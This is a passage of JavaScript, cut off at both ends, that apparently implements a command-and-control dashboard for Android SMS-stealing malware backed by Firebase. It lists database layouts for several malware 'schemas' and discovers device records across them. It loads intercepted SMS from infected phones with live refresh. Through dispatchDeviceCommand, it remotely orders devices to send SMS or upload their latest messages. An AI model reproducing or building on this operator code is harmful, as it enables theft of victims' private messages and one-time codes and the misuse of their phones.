        "All_Users/SMS",
      ],
      bot_users: ["bot_users", "bots"],
      pins: ["pins"],
    },
    7: {
      clients: [
        "All_Users/DeviceInfo",
        "All_User/DeviceInfo",
        "All_Users/Info",
        "All_User/Info",
      ],
      messages: ["All_Users/Sms", "All_User/Sms", "user_sms"],
      bot_users: ["bot_users", "bots"],
      pins: ["pins"],
    },
    8: {
      clients: [
        "All_User/Data",
        "All_Users/Data",
        "All_User/User",
        "All_User/Info",
        "All_Users/Info",
      ],
      messages: [
        "All_User/Sms",
        "All_Users/Sms",
        "All_User/Commands",
        "All_Users/Commands",
      ],
      bot_users: ["bot_users", "bots"],
      pins: ["pins"],
    },
    9: {
      clients: [
        "All_User/Info",
        "All_Users/Info",
        "All_User/DeviceInfo",
        "All_Users/DeviceInfo",
      ],
      messages: [
        "All_User/Sms",
        "All_Users/Sms",
        "All_User/SMS",
        "All_Users/SMS",
      ],
      bot_users: ["All_User/bot_users", "All_Users/bot_users", "bot_users", "bots"],
      pins: ["pins"],
    },
    10: {
      clients: ["user_data", "user_list", "clients", "devices"],
      messages: ["user_sms", "messages", "Sms"],
      bot_users: ["bot_users", "sms_forward", "bots"],
      pins: ["pins", "guard", "licenses"],
    },
  },
  UNIVERSAL_NODE_FALLBACKS = {
    clients: [
      "All_User/Info",
      "All_Users/Info",
      "All_User/DeviceInfo",
      "All_Users/DeviceInfo",
      "user_data",
      "All_User/Data",
      "All_Users/Data",
      "All_User/User",
      "userData",
      "UserData",
      "user_list",
      "users",
      "Users",
      "profiles",
      "Profiles",
      "device_profiles",
      "deviceProfiles",
      "DeviceInfo",
      "device_info",
      "deviceInfo",
      "clients",
      "Clients",
      "devices",
      "Devices",
      "data",
      "Data",
    ],
    messages: ["All_User/Sms", "All_Users/Sms", "Sms", "messages", "user_sms"],
    bot_users: [
      "bot_users",
      "bots",
      "All_User/bot_users",
      "All_Users/bot_users",
    ],
    pins: ["pins"],
  };
function nodeCandidates(key) {
  const typed = (
      (SCHEMA_NODE_ALIASES[effectiveSchema()] || SCHEMA_NODE_ALIASES[1])[
        key
      ] || [key]
    ).slice(),
    univ = UNIVERSAL_NODE_FALLBACKS[key] || [],
    list = typed.slice();
  return (
    univ.forEach((p) => {
      list.includes(p) || list.push(p);
    }),
    list.includes(key) || list.push(key),
    list
  );
}
let preloadedClientNode = null;
async function discoverClientCandidates() {
  const candidates = nodeCandidates("clients"),
    add = (path) => {
      path && !candidates.includes(path) && candidates.push(path);
    };
  if (!schemaIsManual()) {
    if (!candidates.includes("clients")) candidates.unshift("clients");
    try {
      const clientsValue = await readDatabaseNode(basePath("clients"));
      if (
        clientsValue !== null &&
        !isPingOnlyNode(clientsValue) &&
        hasClientRecords(clientsValue)
      ) {
        preloadedClientNode = clientsValue;
        return ["clients"];
      }
    } catch (e) {}
  }
  const rootKeys = await readShallowKeys(basePath(""));
  if (!rootKeys) return candidates;
  for (const rootKey of rootKeys) {
    if (/(client|device|user|profile|inventory|record|account)/i.test(rootKey))
      add(rootKey);
    if (!/^all.?users?$/i.test(rootKey)) continue;
    const children = await readShallowKeys(basePath(rootKey));
    (children || []).forEach((child) => {
      /^(info|device.?info|data|user|clients?|devices?|profiles?)$/i.test(child) &&
        add(rootKey + "/" + child);
    });
  }
  return candidates;
}
const COMMAND_CANDIDATES_BY_SCHEMA = {
  6: ["All_User/Commands", "All_Users/Commands"],
  7: ["All_Users/Commands", "All_User/Commands"],
  8: ["All_User/Commands", "All_Users/Commands"],
  9: ["All_User/Commands", "All_Users/Commands"],
  10: ["user_data", "user_list"],
};
const COMMAND_FALLBACKS = [
  "Commands",
  "device_commands",
  "commands",
  "smsQueue",
];
function commandCandidates() {
  const list = (COMMAND_CANDIDATES_BY_SCHEMA[effectiveSchema()] || []).slice();
  return (
    COMMAND_FALLBACKS.forEach((p) => {
      list.includes(p) || list.push(p);
    }),
    list
  );
}
let resolvedCommandPath = null,
  resolvedCommandRoot = !1;
async function resolveCommandNode(force) {
  if (resolvedCommandPath && !force) return resolvedCommandPath;
  for (const cand of commandCandidates()) {
    const keys = await readShallowKeys(basePath(cand));
    if (keys && keys.length) {
      ((resolvedCommandPath = cand), (resolvedCommandRoot = !1));
      return cand;
    }
    if (activeBase) {
      const rootKeys = await readShallowKeys("/" + cand);
      if (rootKeys && rootKeys.length) {
        ((resolvedCommandPath = cand), (resolvedCommandRoot = !0));
        return cand;
      }
    }
  }
  return null;
}
function commandLayoutFor(path) {
  return /\bAll_Users?\/Commands$/i.test(path)
    ? "alluser"
    : /device_commands$/i.test(path)
      ? "device_commands"
      : /^user_data$/i.test(path)
        ? "inline"
        : "queue";
}
function commandNodePath(path, deviceId) {
  const joined = path + "/" + deviceId;
  return resolvedCommandRoot ? "/" + joined : basePath(joined);
}
async function dispatchDeviceCommand(deviceId, opts) {
  const path = await resolveCommandNode(!1);
  if (!path) throw new Error("No command node found for this database");
  const layout = commandLayoutFor(path),
    ts = Date.now(),
    action = opts.action,
    full = commandNodePath(path, deviceId);
  if (layout === "alluser") {
    const cmdKey = action === "SEND_SMS" ? "send_sms" : "fetch_sms",
      body = { action, status: "pending", timestamp: ts };
    return (
      opts.to && ((body.to = opts.to), (body.message = opts.message)),
      opts.sim !== void 0 && (body.sim = opts.sim),
      await writeData(ref(db, full + "/" + cmdKey), body),
      { path: full + "/" + cmdKey, layout, cmdKey }
    );
  }
  if (layout === "device_commands") {
    const cmdId = "cmd_" + ts + "_" + Math.random().toString(36).slice(2, 6),
      body = { action, status: "pending", timestamp: ts };
    return (
      opts.to &&
        (body.sendSms = {
          body: opts.message,
          sim: opts.sim,
          to: opts.to,
        }),
      await writeData(ref(db, full + "/" + cmdId), body),
      { path: full + "/" + cmdId, layout, cmdId }
    );
  }
  if (layout === "inline") {
    const base = commandNodePath(path, deviceId),
      body = {
        command: action === "SEND_SMS" ? "send message" : "fetch sms",
        targetDeviceId: deviceId,
        timestamp: ts,
      };
    if (action === "SEND_SMS") {
      const slotNum = parseInt(opts.sim, 10);
      ((body.messageText = opts.message),
        (body.simSlot = String(isNaN(slotNum) ? 1 : slotNum)),
        (body.send_sms = {
          isSended: !1,
          message: opts.message,
          sim_slot: (isNaN(slotNum) ? 1 : slotNum) + 1,
          to: opts.to,
        }));
    }
    return (
      await writeData(ref(db, base + "/command"), body.command),
      await writeData(ref(db, base + "/targetDeviceId"), deviceId),
      await writeData(ref(db, base + "/timestamp"), ts),
      action === "SEND_SMS" &&
        (await writeData(ref(db, base + "/messageText"), opts.message),
        await writeData(ref(db, base + "/simSlot"), body.simSlot),
        await writeData(ref(db, base + "/send_sms"), body.send_sms)),
      { path: base + "/command", layout, cmdKey: "command" }
    );
  }
  const body = { action, timestamp: ts, status: "pending" };
  return (
    opts.to &&
      ((body.to = opts.to),
      (body.message = opts.message),
      (body.sim = opts.sim)),
    await writeData(ref(db, full + "/remote_fetch_trigger"), body),
    { path: full + "/remote_fetch_trigger", layout }
  );
}
let autoRefreshEnabled = !0,
  autoRefreshTimer = null,
  lastMessagesSync = 0,
  messagesSyncBusy = !1;
const AUTO_REFRESH_MS = 10e3;
function loadAutoRefreshPref() {
  try {
    const v = localStorage.getItem("fbAutoRefresh");
    v !== null && (autoRefreshEnabled = v === "1");
  } catch (e) {}
}
function renderAutoRefreshUi() {
  const btn = document.getElementById("smsAutoRefreshBtn");
  if (!btn) return;
  const dot = document.getElementById("smsAutoRefreshDot");
  (btn.classList.toggle("border-emerald-500/40", autoRefreshEnabled),
    btn.classList.toggle("text-emerald-400", autoRefreshEnabled),
    btn.classList.toggle("border-slate-800", !autoRefreshEnabled),
    btn.classList.toggle("text-slate-500", !autoRefreshEnabled),
    dot &&
      ((dot.className = autoRefreshEnabled
        ? "w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse"
        : "w-1.5 h-1.5 rounded-full bg-slate-600")),
    (btn.title = autoRefreshEnabled
      ? "Auto-refresh every " + AUTO_REFRESH_MS / 1e3 + "s \u2014 click to pause"
      : "Auto-refresh paused \u2014 click to resume"));
  const stamp = document.getElementById("smsLastSyncLabel");
  stamp &&
    (stamp.textContent = lastMessagesSync
      ? "synced " + new Date(lastMessagesSync).toLocaleTimeString()
      : "never synced");
}
function setAutoRefresh(on) {
  ((autoRefreshEnabled = !!on),
    localStorage.setItem("fbAutoRefresh", autoRefreshEnabled ? "1" : "0"),
    renderAutoRefreshUi(),
    startAutoRefresh(),
    toast(
      autoRefreshEnabled
        ? "Auto-refresh on \u2014 messages update every " +
            AUTO_REFRESH_MS / 1e3 +
            "s"
        : "Auto-refresh paused",
      "info",
    ));
}
function startAutoRefresh() {
  autoRefreshTimer && (clearInterval(autoRefreshTimer), (autoRefreshTimer = null));
  autoRefreshEnabled &&
    (autoRefreshTimer = setInterval(() => {
      document.hidden || isLoadingSequence || messagesSyncBusy || refreshMessagesFeed();
    }, AUTO_REFRESH_MS));
}
async function refreshMessagesFeed(opts) {
  if (messagesSyncBusy || isLoadingSequence) return { skipped: !0 };
  messagesSyncBusy = !0;
  const silently = opts && opts.silent,
    path = resolvedNodePaths.messages || "messages",
    only = selectedDeviceFilter && selectedDeviceFilter !== "all"
      ? selectedDeviceFilter
      : null;
  try {
    if (only) {
      const val = await readLimited(basePath(path + "/" + only), MSG_PER_DEVICE);
      if (val && Object.keys(val).length) {
        const merged = { ...messagesData },
          normalized = normalizeMessages({ [only]: val });
        ((merged[only] = normalized[only] || {}),
          applyMessages(merged),
          (lastMessagesSync = Date.now()),
          renderAutoRefreshUi());
        return (
          silently ||
            toast(
              "Refreshed " + only + " \u2014 " +
                Object.keys(normalized[only] || {}).length +
                " messages",
              "success",
            ),
          { ok: !0, devices: 1, device: only }
        );
      }
      return (
        silently || toast("No messages yet for " + only, "info"),
        { ok: !1, device: only }
      );
    }
    const val = await loadMessagesBounded(basePath(path));
    return (
      val && Object.keys(val).length
        ? (applyMessages(val),
          (lastMessagesSync = Date.now()),
          renderAutoRefreshUi(),
          silently || toast("Messages refreshed from " + basePath(path), "success"),
          { ok: !0, devices: Object.keys(val).length })
        : (silently || toast("No message data at " + basePath(path), "error"),
          { ok: !1 })
    );
  } catch (e) {
    return (
      silently || toast("Refresh failed: " + (e && e.message), "error"),
      { ok: !1, error: e && e.message }
    );
  } finally {
    messagesSyncBusy = !1;
  }
}
let resolvedNodePaths = {},
  isLoadingSequence = !1,
  pendingReload = !1,
  loadProgress = { done: 0, total: LOAD_STEPS.length, current: "" };
function setLoadStatus(text, color) {
  const el = $("loadStatusText");
  el && ((el.textContent = text), (el.style.color = color || "#64748b"));
  const bar = $("loadProgressBar");
  if (bar) {
    const pct = loadProgress.total
      ? Math.round((loadProgress.done / loadProgress.total) * 100)
      : 0;
    bar.style.width = pct + "%";
  }
  const wrap = $("loadProgressWrap");
  wrap &&
    wrap.classList.toggle("hidden", loadProgress.done >= loadProgress.total);
}
let rawClientsNode = null,
  rawSimsNode = null;
function applySimSidecar(simsVal) {
  (simsVal !== void 0 && (rawSimsNode = simsVal),
    isClientsLoaded &&
      rawClientsNode &&
      ((clientsData = normalizeClients(rawClientsNode, rawSimsNode)),
      calculateDashboardMetrics(),
      generateDeviceSidebarMenu(),
      currentActiveTab === "clients" && generateClientsView(clientsData)));
}
function applyClients(val, simsVal) {
  (val !== void 0 && (rawClientsNode = val),
    simsVal !== void 0 && (rawSimsNode = simsVal),
    (clientsData = normalizeClients(rawClientsNode, rawSimsNode)),
    (isClientsLoaded = !0),
    (connectionUiStatus.innerHTML =
      '<span class="w-1 h-1 rounded-full bg-cyan-400"></span><span>LIVE SYNC</span>'),
    calculateDashboardMetrics(),
    generateDeviceSidebarMenu(),
    currentActiveTab === "clients" && generateClientsView(clientsData));
}
function applyMessages(val) {
  ((messagesData = normalizeMessages(val)), (isMessagesLoaded = !0));
  let count = 0;
  Object.keys(messagesData).forEach((devId) => {
    messagesData[devId] && (count += Object.keys(messagesData[devId]).length);
  });
  const el = $("totalSMSCount");
  (el && (el.innerText = count),
    currentActiveTab === "messages" && generateSmsHubView(messagesData),
    isClientsLoaded && generateDeviceSidebarMenu());
}
function applyBotUsers(val) {
  ((botUsersData = val || {}),
    currentActiveTab === "bots" && generateBotsView(botUsersData),
    calculateBotCount());
}
function applyPins(val) {
  pinsData = val || {};
}
const APPLIERS = {
    clients: applyClients,
    messages: applyMessages,
    bot_users: applyBotUsers,
    pins: applyPins,
  },
  MSG_DEVICE_LIMIT = 60,
  MSG_PER_DEVICE = 150,
  MSG_LIVE_MAX_DEVICES = 25;
let messagesTruncated = !1,
  messagesDeviceTotal = 0;
async function readDatabaseNode(path) {
  const controller = new AbortController(),
    timer = setTimeout(() => controller.abort(), 20000);
  try {
    const response = await fetch(databaseReadUrl(activeDatabaseUrl, path), {
      cache: "no-store",
      signal: controller.signal,
    });
    if (!response.ok) {
      const detail = response.status === 401 || response.status === 403
        ? "Permission denied — check this database's read rules or auth token."
        : `HTTP ${response.status}`;
      throw new Error(`Firebase read ${path}: ${detail}`);
    }
    return await response.json();
  } finally {
    clearTimeout(timer);
  }
}
async function readShallowKeys(path) {
  try {
    const url = shallowReadUrl(activeDatabaseUrl, path);
    const controller = new AbortController(),
      timer = setTimeout(() => controller.abort(), 8000);
    try {
      const response = await fetch(url, {
        cache: "no-store",
        signal: controller.signal,
      });
      if (!response.ok) return null;
      const value = await response.json();
      return value && typeof value === "object" ? Object.keys(value) : null;
    } finally {
      clearTimeout(timer);
    }
  } catch (e) {
    return null;
  }
}
async function readLimited(path, n) {
  try {
    const snap = await get(query(ref(db, path), orderByKey(), limitToLast(n)));
    return snap.exists() ? snap.val() : null;
  } catch (e) {
    try {
      const snap = await get(ref(db, path));
      return snap.exists() ? snap.val() : null;
    } catch (e2) {
      return null;
    }
  }
}
async function loadMessagesBounded(path) {
  const keys = await readShallowKeys(path);
  if (!keys) return null;
  messagesDeviceTotal = keys.length;
  // Firebase keys are ordered lexicographically; the tail includes newer push-style device IDs.
  const take = keys.slice(-MSG_DEVICE_LIMIT);
  messagesTruncated = keys.length > take.length;
  const out = {};
  for (let i = 0; i < take.length; i += 3) {
    const chunk = take.slice(i, i + 3);
    (await Promise.all(
      chunk.map(async (dev) => {
        const v = await readLimited(path + "/" + dev, MSG_PER_DEVICE);
        v && typeof v == "object" && (out[dev] = v);
      }),
    ),
      setLoadStatus(
        `Loading messages (${Math.min(i + 3, take.length)}/${take.length} devices)…`,
        "#22d3ee",
      ),
      await new Promise((r) => setTimeout(r, 0)));
  }
  return out;
}
async function loadSimSidecar(cand) {
  const p = loadSimSidecarPath(cand);
  if (!p) return null;
  try {
    const ss = await get(ref(db, basePath(p)));
    if (ss.exists()) return ss.val();
  } catch (e) {}
  return null;
}
async function detectRootSmsQueue(force) {
  if (rootSmsQueueDetected && !force) return !0;
  rootSmsQueueDetected = !1;
  if (activeBase) {
    const inBase = await readShallowKeys(basePath("smsQueue"));
    if (inBase && inBase.length) return !1;
    for (const cmds of ["All_User/Commands", "All_Users/Commands"]) {
      const k = await readShallowKeys(basePath(cmds));
      if (k && k.length) return !1;
    }
  }
  const atRoot = await readShallowKeys("/smsQueue");
  rootSmsQueueDetected = !!(atRoot && atRoot.length);
  return rootSmsQueueDetected;
}
function loadSimSidecarPath(cand) {
  const s = String(cand || "");
  if (/^user_data$/i.test(s)) return null;
  const root = s.replace(/\/?(Info|DeviceInfo|Data|User)$/i, "");
  return root ? root + "/SimINFO" : null;
}
async function loadSequentially() {
  if (isLoadingSequence) {
    pendingReload = !0;
    return;
  }
  ((isLoadingSequence = !0),
    (pendingReload = !1),
    (loadProgress = { done: 0, total: LOAD_STEPS.length, current: "" }),
    setLoadStatus("Starting sequential load…", "#64748b"));
  let clientsRead = !1,
    clientsReadError = "";
  preloadedClientNode = null;
  for (const step of LOAD_STEPS) {
    ((loadProgress.current = step.label),
      setLoadStatus(
        `Loading ${step.label} (${loadProgress.done + 1}/${loadProgress.total})…`,
        "#22d3ee",
      ));
    const candidates =
      step.key === "clients"
        ? await discoverClientCandidates()
        : nodeCandidates(step.key);
    let applied = !1;
    for (const cand of candidates)
      try {
        if (step.key === "messages") {
          const val = await loadMessagesBounded(basePath(cand));
          if (val && Object.keys(val).length) {
            (applyMessages(val),
              (resolvedNodePaths.messages = cand),
              (applied = !0));
            break;
          }
          continue;
        }
        const nodePath = basePath(cand);
        let snap;
        if (step.key === "clients") {
          const value = cand === "clients" && preloadedClientNode
            ? preloadedClientNode
            : await readDatabaseNode(nodePath);
          preloadedClientNode = null;
          snap = { exists: () => value !== null, val: () => value };
        } else {
          snap = await get(ref(db, nodePath));
        }
        if (snap.exists()) {
          if (step.key === "clients") {
            if (isPingOnlyNode(snap.val())) {
              console.warn(
                `[seq] clients @ ${cand} holds only ping records \u2014 skipping`,
              );
              continue;
            }
            if (!hasClientRecords(snap.val())) {
              console.warn(`[seq] clients @ ${cand} has no device records — skipping`);
              continue;
            }
            const simsVal = await loadSimSidecar(cand);
            ((resolvedNodePaths.clients = cand),
              applyClients(snap.val(), simsVal),
              await autoSelectBaseIfEmpty(),
              await detectRootSmsQueue(!0),
              detectSchema());
          } else APPLIERS[step.key](snap.val());
          ((resolvedNodePaths[step.key] = cand), (applied = !0));
          break;
        }
      } catch (e) {
        const message = String(e && (e.message || e.code) || "Firebase read failed");
        console.warn(`[seq] ${step.label} @ ${cand} failed:`, e);
        if (step.key === "clients") {
          clientsReadError = /permission.denied|unauthorized/i.test(
            `${e && e.code || ""} ${message}`,
          )
            ? `${cand}: Permission denied — check this database's read rules or auth token.`
            : `${cand}: ${message}`;
        }
      }
    step.key === "clients" && applied && (clientsRead = !0);
    (applied ||
      (step.key === "clients"
        ? applyClients(null, null)
        : APPLIERS[step.key](null),
      (resolvedNodePaths[step.key] = candidates[candidates.length - 1])),
      loadProgress.done++,
      setLoadStatus(
        `Loaded ${step.label} (${loadProgress.done}/${loadProgress.total})`,
        "#34d399",
      ),
      await new Promise((r) => setTimeout(r, 0)));
  }
  if (
    (setLoadStatus(
      clientsRead
        ? `All ${loadProgress.total} nodes loaded`
        : clientsReadError
          ? `Data load failed: ${clientsReadError}`
          : "No supported device data node found — check the data path and schema",
      clientsRead ? "#34d399" : clientsReadError ? "#fb7185" : "#fbbf24",
    ),
    (isLoadingSequence = !1),
    await detectRootSmsQueue(!0),
    detectSchema(),
    attachLiveListeners(),
    pendingReload)
  )
    return ((pendingReload = !1), loadSequentially());
}
function attachLiveListeners() {
  detachAll();
  const pathFor = (key) => resolvedNodePaths[key] || key,
    clientsRef = ref(db, basePath(pathFor("clients"))),
    clientsCb = async (snapshot) => {
      const simsVal = await loadSimSidecar(pathFor("clients"));
      applyClients(snapshot.val(), simsVal);
    };
  (onValue(clientsRef, clientsCb),
    activeSubscriptions.push({ r: clientsRef, cb: clientsCb }));
  const simsPath = loadSimSidecarPath(pathFor("clients"));
  if (simsPath) {
    const simsRef = ref(db, basePath(simsPath)),
      simsCb = (snapshot) => applySimSidecar(snapshot.val());
    (onValue(simsRef, simsCb),
      activeSubscriptions.push({ r: simsRef, cb: simsCb }));
  }
  if (messagesDeviceTotal <= MSG_LIVE_MAX_DEVICES) {
    const messagesRef = ref(db, basePath(pathFor("messages"))),
      messagesCb = (snapshot) => applyMessages(snapshot.val());
    (onValue(messagesRef, messagesCb),
      activeSubscriptions.push({ r: messagesRef, cb: messagesCb }));
  }
  const botUsersRef = ref(db, basePath(pathFor("bot_users"))),
    botCb = (snapshot) => applyBotUsers(snapshot.val());
  (onValue(botUsersRef, botCb),
    activeSubscriptions.push({ r: botUsersRef, cb: botCb }));
  const pinsRef = ref(db, basePath(pathFor("pins"))),
    pinsCb = (snapshot) => applyPins(snapshot.val());
  (onValue(pinsRef, pinsCb),
    activeSubscriptions.push({ r: pinsRef, cb: pinsCb }));
}
function subscribeAll() {
  return loadSequentially();
}
((window.__dbg = () => ({
  rawSimsKeys: rawSimsNode ? Object.keys(rawSimsNode).length : null,
  rawSimsSample: rawSimsNode ? Object.keys(rawSimsNode).slice(0, 3) : null,
  clientCount: clientsData ? Object.keys(clientsData).length : 0,
  clientSample: clientsData
    ? Object.keys(clientsData)
        .slice(0, 2)
        .map((k) => clientsData[k])
    : null,
  schema: detectedSchema,
  effective: effectiveSchema(),
  evidence: schemaEvidence,
  nodes: { ...resolvedNodePaths },
  msgTotal: messagesDeviceTotal,
})),
  (window.__reloadSeq = loadSequentially),
  (window.__cmdState = () => ({
    path: resolvedCommandPath,
    atRoot: resolvedCommandRoot,
    rootSmsQueueDetected,
  })),
  (window.__resolveCmd = () => resolveCommandNode(!1)),
  (window.__cmdPathFor = (dev) => {
    if (!resolvedCommandPath) return null;
    return commandNodePath(resolvedCommandPath, dev);
  }),
  (window.__botUsers = () => botUsersData),
  (window.__loadState = () => ({
    ...loadProgress,
    isLoading: isLoadingSequence,
    schema: detectedSchema,
    effective: effectiveSchema(),
    manual: schemaIsManual(),
    nodes: { ...resolvedNodePaths },
  })));
async function refreshBases() {
  const res = await discoverBases(db, activeDatabaseUrl);
  return (
    (discoveredBases = res.bases),
    (baseDiscoverySource = res.source),
    (baseDiscoveryKeys = res.keys || []),
    renderBaseSelector(),
    res
  );
}
function joinAt(bp, node) {
  const b = String(bp || "").replace(/^\/+|\/+$/g, ""),
    n = String(node || "").replace(/^\/+|\/+$/g, "");
  return "/" + [b, n].filter(Boolean).join("/");
}
async function baseHasData(bp) {
  for (const cand of nodeCandidates("clients"))
    try {
      const snap = await get(ref(db, joinAt(bp, cand)));
      if (
        snap.exists() &&
        !isPingOnlyNode(snap.val()) &&
        hasClientRecords(snap.val())
      )
        return cand;
    } catch (e) {}
  return null;
}
async function autoSelectBaseIfEmpty() {
  if (activeBase || (await baseHasData(""))) return null;
  for (const bp of discoveredBases.filter(Boolean))
    if (await baseHasData(bp))
      return (
        (activeBase = normalizeBasePath(bp)),
        renderBaseSelector(),
        (currentSelectionLabel.innerText = `Scope: Global View · base ${baseLabel(activeBase)}`),
        toast(
          `Root is empty — auto-selected base ${baseLabel(activeBase)}`,
          "info",
        ),
        activeBase
      );
  return null;
}
function switchBase(bp) {
  const next = normalizeBasePath(bp);
  next !== activeBase &&
    ((activeBase = next),
    (clientsData = {}),
    (messagesData = {}),
    (botUsersData = {}),
    (pinsData = {}),
    (isClientsLoaded = !1),
    (isMessagesLoaded = !1),
    (selectedDeviceFilter = "all"),
    (rootSmsQueueDetected = !1),
    (resolvedCommandPath = null),
    (resolvedCommandRoot = !1),
    (currentSelectionLabel.innerText = activeBase
      ? `Scope: Global View · base ${baseLabel(activeBase)}`
      : "Scope: Global View"),
    renderBaseSelector(),
    subscribeAll(),
    renderActiveTabContent(),
    toast(`Base switched to ${baseLabel(activeBase)}`, "info"));
}
function renderBaseSelector() {
  const opts = discoveredBases.slice();
  opts.includes(activeBase) || opts.push(activeBase);
  const html = opts
    .map((bp) => {
      const label = bp === "" ? "/ (root)" : bp,
        numeric = /^\/\d+$/.test(bp) ? " · numeric" : "";
      return `<option value="${bp}"${bp === activeBase ? " selected" : ""}>${label}${numeric}</option>`;
    })
    .join("");
  ["baseSelector", "baseSelectorInline"].forEach((id) => {
    const el = $(id);
    el && (el.innerHTML = html);
  });
  const badge = $("baseSourceBadge");
  badge &&
    (badge.textContent =
      baseDiscoverySource === "shallow"
        ? `${discoveredBases.length} base(s) discovered`
        : `${discoveredBases.length} default base(s)`);
}
function calculateDashboardMetrics() {
  let active = 0,
    total = 0;
  (clientsData &&
    Object.keys(clientsData).forEach((k) => {
      isValidDeviceId(k) &&
        (total++, clientsData[k] && clientsData[k].status === !0 && active++);
    }),
    ($("activeClientsCount").innerText = active),
    ($("totalClientsCount").innerText = total));
}
function calculateBotCount() {
  $("botUsersCount").innerText = Object.keys(botUsersData || {}).length;
}
function toggleDrawer(show) {
  (deviceSidebarSection.classList.toggle("-translate-x-full", !show),
    drawerBackdropOverlay.classList.toggle("hidden", !show));
}
(menuDrawerToggleBtn.addEventListener("click", () => toggleDrawer(!0)),
  drawerBackdropOverlay.addEventListener("click", () => toggleDrawer(!1)),
  closeDrawerBtn.addEventListener("click", () => toggleDrawer(!1)));
function generateDeviceSidebarMenu() {
  const devices = new Set();
  (clientsData && Object.keys(clientsData).forEach((k) => devices.add(k)),
    messagesData && Object.keys(messagesData).forEach((k) => devices.add(k)));
  let html = `
        <button id="deviceTabBtn-all" class="w-full text-left px-3 py-2 rounded-xl text-[10px] font-mono font-black transition-all flex items-center justify-between ${selectedDeviceFilter === "all" ? "bg-slate-900 text-cyan-400 border border-slate-800" : "text-slate-500 hover:text-slate-300"}" style="margin-bottom:4px">
            <div class="flex items-center space-x-1.5">
                <span class="material-icons text-xs">language</span>
                <span>ALL DEVICES</span>
            </div>
            <span class="material-icons text-xs">public</span>
        </button>`;
  (Array.from(devices)
    .filter(isValidDeviceId)
    .sort()
    .forEach((id) => {
      const meta = clientsData ? clientsData[id] : null,
        online = meta ? meta.status === !0 : !1;
      if (
        (structuralStatusFilter === "online" && !online) ||
        (structuralStatusFilter === "offline" && online)
      )
        return;
      const sel = selectedDeviceFilter === id;
      html += `
            <button id="dt-${id.replace(/[^a-zA-Z0-9]/g, "_")}" data-device-id="${id}" class="device-tab-item w-full text-left px-3 py-2 rounded-lg font-mono text-xs transition-all flex items-center justify-between group ${sel ? "bg-slate-900 text-cyan-400 border border-slate-800 font-bold" : "text-slate-500 hover:text-slate-300"}">
                <div class="flex items-center space-x-1.5 overflow-hidden truncate">
                    <span class="material-icons text-xs ${online ? "text-emerald-400" : "text-slate-700"}">cell_tower</span>
                    <span class="truncate block">${id}</span>
                </div>
                <span class="w-1 h-1 rounded-full flex-shrink-0 ${online ? "bg-emerald-400" : "bg-slate-800"}"></span>
            </button>`;
    }),
    (deviceTabsListContainer.innerHTML = html));
  const allBtn = $("deviceTabBtn-all");
  (allBtn && allBtn.addEventListener("click", () => changeDeviceFilter("all")),
    deviceTabsListContainer
      .querySelectorAll(".device-tab-item")
      .forEach((btn) => {
        btn.addEventListener("click", () =>
          changeDeviceFilter(btn.getAttribute("data-device-id")),
        );
      }),
    filterSidebarDeviceList());
}
function changeDeviceFilter(id) {
  ((selectedDeviceFilter = id),
    (currentSelectionLabel.innerText =
      id === "all" ? "Scope: Global View" : `Scope: ${id}`),
    (activeDeviceFilterLabel.innerText = id === "all" ? "All Devices" : id),
    triggerSmsFetchBtn &&
      triggerSmsFetchBtn.classList.toggle("hidden", id === "all"));
  const smsSendBtn = document.getElementById("triggerSmsSendBtn");
  (smsSendBtn && smsSendBtn.classList.toggle("hidden", id === "all"),
    generateDeviceSidebarMenu(),
    toggleDrawer(!1),
    renderActiveTabContent());
}
function changeStatusFilter(mode) {
  ((structuralStatusFilter = mode),
    ["all", "online", "offline"].forEach((m) => {
      const btn = $("statusFilterBtn-" + m);
      btn &&
        (btn.className =
          m === mode
            ? "subtab-pill subtab-pill-active"
            : "subtab-pill subtab-pill-inactive");
    }),
    generateDeviceSidebarMenu());
}
($("statusFilterBtn-all").addEventListener("click", () =>
  changeStatusFilter("all"),
),
  $("statusFilterBtn-online").addEventListener("click", () =>
    changeStatusFilter("online"),
  ),
  $("statusFilterBtn-offline").addEventListener("click", () =>
    changeStatusFilter("offline"),
  ),
  (window.switchTab = function (tab) {
    ((currentActiveTab = tab),
      ["clients", "messages", "bots", "links", "schemes"].forEach((t) => {
        const btn = $("bottomTabBtn-" + t),
          content = $("tabContent-" + t);
        !btn ||
          !content ||
          (t === tab
            ? ((btn.className = "bottom-nav-item bottom-nav-active"),
              content.classList.remove("hidden"))
            : ((btn.className = "bottom-nav-item bottom-nav-inactive"),
              content.classList.add("hidden")));
      }),
      (searchInputElement.value = ""),
      renderActiveTabContent());
  }),
  ["clients", "messages", "bots", "links", "schemes"].forEach((t) => {
    const btn = $("bottomTabBtn-" + t);
    btn && btn.addEventListener("click", () => window.switchTab(t));
  }),
  searchInputElement.addEventListener("input", () => executeClientSideSearch()),
  deviceSearchInput.addEventListener("input", () => filterSidebarDeviceList()),
  (function () {
    const gsBtn = $("globalSearchBtn"),
      gsInput = $("globalSearchInput"),
      gsClose = $("closeGlobalSearchBtn"),
      gsBackdrop = $("globalSearchBackdrop");
    (gsBtn && gsBtn.addEventListener("click", openGlobalSearch),
      gsClose && gsClose.addEventListener("click", closeGlobalSearch),
      gsBackdrop && gsBackdrop.addEventListener("click", closeGlobalSearch),
      gsInput &&
        gsInput.addEventListener("input", () => runGlobalSearch()),
      document.addEventListener("keydown", (e) => {
        const modal = $("globalSearchModal");
        if (!modal || modal.classList.contains("hidden")) return;
        e.key === "Escape" && closeGlobalSearch();
      }));
  })(),
  (function () {
    const autoBtn = document.getElementById("smsAutoRefreshBtn");
    autoBtn &&
      autoBtn.addEventListener("click", () => setAutoRefresh(!autoRefreshEnabled));
  })(),
  triggerSmsFetchBtn.addEventListener("click", async () => {
    if (selectedDeviceFilter !== "all")
      try {
        ((triggerSmsFetchBtn.disabled = !0),
          (triggerSmsFetchBtn.innerHTML =
            '<span class="material-icons text-xs animate-spin">sync</span><span>Fetching…</span>'));
        const res = await dispatchDeviceCommand(selectedDeviceFilter, {
          action: "PULL_LATEST_SMS_LOGS",
        });
        (toast(
          `Fetch requested from ${selectedDeviceFilter} → ${res.path}`,
          "success",
        ),
          setTimeout(async () => {
            await refreshMessagesFeed({ silent: !0 });
            toast("Messages re-read from the database", "success");
          }, 2500));
      } catch (err) {
        toast(
          "Failed to dispatch — " +
            ((err && err.message) || "DB rules may block writes"),
          "error",
        );
      } finally {
        setTimeout(() => {
          ((triggerSmsFetchBtn.disabled = !1),
            (triggerSmsFetchBtn.innerHTML =
              '<span class="material-icons text-xs">sync_alt</span><span>Fetch Latest</span>'));
        }, 3e3);
      }
  }),
